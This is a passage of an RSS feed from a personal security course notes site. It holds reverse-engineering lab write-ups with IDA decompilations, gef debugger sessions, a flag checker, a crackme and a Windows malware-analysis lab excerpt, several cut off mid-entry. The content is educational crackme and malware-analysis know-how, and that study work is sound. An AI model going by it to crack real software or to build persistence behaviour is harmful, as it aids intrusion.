&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (;;)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		memu();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">int&lt;/span> choice &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">switch&lt;/span> (choice)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			register_entity();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			delete_entity();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			trigger_event();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			puts(&lt;span style="color:#e6db74">&amp;#34;Invalid command&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse - 0x01(Lab - Sacred Arts)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x01lab---sacred-arts/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x01lab---sacred-arts/</guid><description>&lt;h1 id="simple-reverse---0x01lab---sacred-arts">
 Simple Reverse - 0x01(Lab - Sacred Arts)
 &lt;a class="anchor" href="#simple-reverse---0x01lab---sacred-arts">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://zh.wikibooks.org/wiki/X86%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80/%E5%9F%BA%E6%9C%AC%E6%8C%87%E4%BB%A4%E9%9B%86">X86組合語言/基本指令集&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.ibm.com/docs/en/aix/7.1?topic=set-neg-negate-instruction">neg (Negate) instruction&lt;/a>
實作：先在執行&lt;code>neg rax&lt;/code>之前把&lt;code>$rax&lt;/code>設定成2，執行指令之後剛好是2的補數
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">gef➤ set $rax=2
gef➤ info r $rax
rax 0x2 0x2
gef➤ ni
0x00000000004010e0 in ?? ()
gef➤ info r $rax
rax 0xfffffffffffffffe 0xfffffffffffffffe
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;a href="https://zh.wikibooks.org/zh/X86%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80/%E5%9F%BA%E6%9C%AC%E6%8C%87%E4%BB%A4%E9%9B%86/IA32%E6%8C%87%E4%BB%A4:xchg">X86組合語言/基本指令集/IA32指令:xchg&lt;/a>
實作：執行&lt;code>xchg ah, al&lt;/code>之前先看一下&lt;code>$rax&lt;/code>的狀態
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">gef➤ info r $rax
rax 0xfffffffffffffffe 0xfffffffffffffffe
gef➤ ni
0x00000000004010e2 in ?? ()
gef➤ info r $rax
rax 0xfffffffffffffeff 0xfffffffffffffeff
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Pro Disassembler Code&lt;/p></description></item><item><title>Simple Reverse - 0x03(Lab - Why)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x03lab---why/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x03lab---why/</guid><description>&lt;h1 id="simple-reverse---0x03lab---why">
 Simple Reverse - 0x03(Lab - Why)
 &lt;a class="anchor" href="#simple-reverse---0x03lab---why">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://chenhh.gitbooks.io/parallel_processing/content/cython/function_pointer.html">What is function pointer?&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.youtube.com/live/IJlYPH1ljIY?feature=share&amp;amp;t=9587">Lecture Vid.&lt;/a>
&lt;img src="https://hackmd.io/_uploads/BJlVKMiO2.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA main function&lt;/p>
&lt;pre tabindex="0">&lt;code>int __cdecl main(int argc, const char **argv, const char **envp)
{
 int i; // [rsp+Ch] [rbp-4h]

 printf(&amp;#34;Give me flag: &amp;#34;);
 __isoc99_scanf(&amp;#34;%25s&amp;#34;, buf);
 for ( i = 0; i &amp;lt;= 24; ++i )
 {
 if ( buf[i] - 10 != enc_flag[i] )
 return 0;
 }
 pass = 1;
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse - 0x14(2023 Lab - AssemblyDev)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x142023-lab---assemblydev/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x142023-lab---assemblydev/</guid><description>&lt;h1 id="simple-reverse---0x142023-lab---assemblydev">
 Simple Reverse - 0x14(2023 Lab - AssemblyDev)
 &lt;a class="anchor" href="#simple-reverse---0x142023-lab---assemblydev">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Tools
&lt;a href="https://carlosrafaelgn.com.br/Asm86/">Assembly x86 Emulator&lt;/a>
&lt;a href="https://godbolt.org/">Compiler Explorer&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler arithmatic.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> module.checker &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> module.math &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> sys &lt;span style="color:#f92672">import&lt;/span> argv
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>challenge_info &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">let a = MEM[RSP+0x0:RSP+0x4]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">let b = MEM[RSP+0x4:RSP+0x8]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">let c = MEM[RSP+0x8:RSP+0xc]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">EAX = a + b
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">EBX = a - b
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">ECX = -c
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">EDX = 9*a + 7
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>a &lt;span style="color:#f92672">=&lt;/span> get_rand(&lt;span style="color:#ae81ff">4&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>b &lt;span style="color:#f92672">=&lt;/span> get_rand(&lt;span style="color:#ae81ff">4&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c &lt;span style="color:#f92672">=&lt;/span> get_rand(&lt;span style="color:#ae81ff">4&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>init_list &lt;span style="color:#f92672">=&lt;/span> [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (RSP_DEFAULT &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x0&lt;/span>, a, &lt;span style="color:#ae81ff">4&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (RSP_DEFAULT &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x4&lt;/span>, b, &lt;span style="color:#ae81ff">4&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (RSP_DEFAULT &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x8&lt;/span>, c, &lt;span style="color:#ae81ff">4&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ans_list &lt;span style="color:#f92672">=&lt;/span> [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;eax&amp;#34;&lt;/span>, add(a, b, &lt;span style="color:#ae81ff">4&lt;/span>)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;ebx&amp;#34;&lt;/span>, sub(a, b, &lt;span style="color:#ae81ff">4&lt;/span>)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;ecx&amp;#34;&lt;/span>, neg(c, &lt;span style="color:#ae81ff">4&lt;/span>)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;edx&amp;#34;&lt;/span>, add(mul(a, &lt;span style="color:#ae81ff">9&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>), &lt;span style="color:#ae81ff">7&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(argv) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>C&lt;span style="color:#f92672">.&lt;/span>BLUE&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">[+]&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>C&lt;span style="color:#f92672">.&lt;/span>NC&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> Usage: python3 &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>__file__&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> &amp;lt;path_to_asm_file&amp;gt;&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(challenge_info)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit(&lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> code &lt;span style="color:#f92672">=&lt;/span> open(argv[&lt;span style="color:#ae81ff">1&lt;/span>], &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Checker(init_list, ans_list, code)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler data_movement.py&lt;/p></description></item><item><title>Simple Reverse - 0x15(2023 HW - crackme_vectorization)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x152023-hw---crackme_vectorization/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x152023-hw---crackme_vectorization/</guid><description>&lt;h1 id="simple-reverse---0x152023-hw---crackme_vectorization">
 Simple Reverse - 0x15(2023 HW - crackme_vectorization)
 &lt;a class="anchor" href="#simple-reverse---0x152023-hw---crackme_vectorization">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> a1, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a2, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&amp;#34;+&amp;#34; TO EXPAND]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> __isoc99_scanf(&lt;span style="color:#e6db74">&amp;#34;%d&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>user_input_len); &lt;span style="color:#75715e">// 長度為49
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> user_input_len_cp &lt;span style="color:#f92672">=&lt;/span> user_input_len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sqrt_length &lt;span style="color:#f92672">=&lt;/span> sqrt((&lt;span style="color:#66d9ef">double&lt;/span>)user_input_len); &lt;span style="color:#75715e">// 開根號後是7
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> sqrt_length_cp &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)sqrt_length;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( sqrt_length &lt;span style="color:#f92672">&amp;gt;&lt;/span> (&lt;span style="color:#66d9ef">double&lt;/span>)(&lt;span style="color:#66d9ef">int&lt;/span>)sqrt_length )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>sqrt_length_cp;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sqrt_len &lt;span style="color:#f92672">=&lt;/span> _mm_shuffle_epi32(_mm_cvtsi32_si128(sqrt_length_cp), &lt;span style="color:#ae81ff">224&lt;/span>).m128i_u64[&lt;span style="color:#ae81ff">0&lt;/span>];&lt;span style="color:#75715e">// 原本的shuffle num就是user input length的開根號結果
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> space &lt;span style="color:#f92672">=&lt;/span> (struc_1 &lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#ae81ff">0x10uLL&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> space&lt;span style="color:#f92672">-&amp;gt;&lt;/span>sqrt_len &lt;span style="color:#f92672">=&lt;/span> sqrt_len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> size &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">*&lt;/span> sqrt_length_cp &lt;span style="color:#f92672">*&lt;/span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)sqrt_length_cp;&lt;span style="color:#75715e">// size是196
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> shuffle_space &lt;span style="color:#f92672">=&lt;/span> malloc(size);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> space&lt;span style="color:#f92672">-&amp;gt;&lt;/span>content_space &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)shuffle_space;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( user_input_len_cp &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shuffle_space_cp &lt;span style="color:#f92672">=&lt;/span> shuffle_space;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0LL&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> __isoc99_scanf(&lt;span style="color:#e6db74">&amp;#34;%d&amp;#34;&lt;/span>, content);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shuffle_space_cp[len&lt;span style="color:#f92672">++&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> content[&lt;span style="color:#ae81ff">0&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( user_input_len &lt;span style="color:#f92672">&amp;gt;&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)len ); &lt;span style="color:#75715e">// 要輸入東西49次
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( length &lt;span style="color:#f92672">==&lt;/span> sqrt_length_cp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (space_1 &lt;span style="color:#f92672">=&lt;/span> (struc_1 &lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#ae81ff">0x10uLL&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> space_1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>sqrt_len &lt;span style="color:#f92672">=&lt;/span> sqrt_len,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shuffle_space_1 &lt;span style="color:#f92672">=&lt;/span> malloc(size),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> src &lt;span style="color:#f92672">=&lt;/span> cipher_flag,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> space_1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>content_space &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)shuffle_space_1,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memcpy(shuffle_space_1, src, size),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> ugly_matrix_multiplication(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)space_1,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)space), &lt;span style="color:#75715e">// guess_cipher的大小是196
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 他會把我們輸入的東西和他原本的東西一起送到guess_encrypt的這個function中
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">!&lt;/span>memcmp((&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)result[&lt;span style="color:#ae81ff">1&lt;/span>], verify_key, size)) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Correct!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;:(&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0LL&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler IDA Ugly Function&lt;/p></description></item><item><title>Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x162023-lab---winmalware---sub_140001c80/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x162023-lab---winmalware---sub_140001c80/</guid><description>&lt;h1 id="simple-reverse---0x162023-lab---winmalware---sub_140001c80">
 Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80)
 &lt;a class="anchor" href="#simple-reverse---0x162023-lab---winmalware---sub_140001c80">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>分析 eductf-lab.exe 中的 function sub_140001C80 在做什麼，並找出其行為所對應的 MITRE ATT&amp;amp;CK technique ID。
Flag format: FLAG{T1234.001}&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea">GetModuleFileNameA&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-getusernamea">GetUserNameA&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-copyfilea">CopyFileA&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-setfileattributesa">SetFileAttributesA&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Main Function
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Sleep(&lt;span style="color:#ae81ff">0x1B7740u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001C80();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001030();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001120();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001BF0();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>sub_140001C80
:::spoiler IDA Source Code
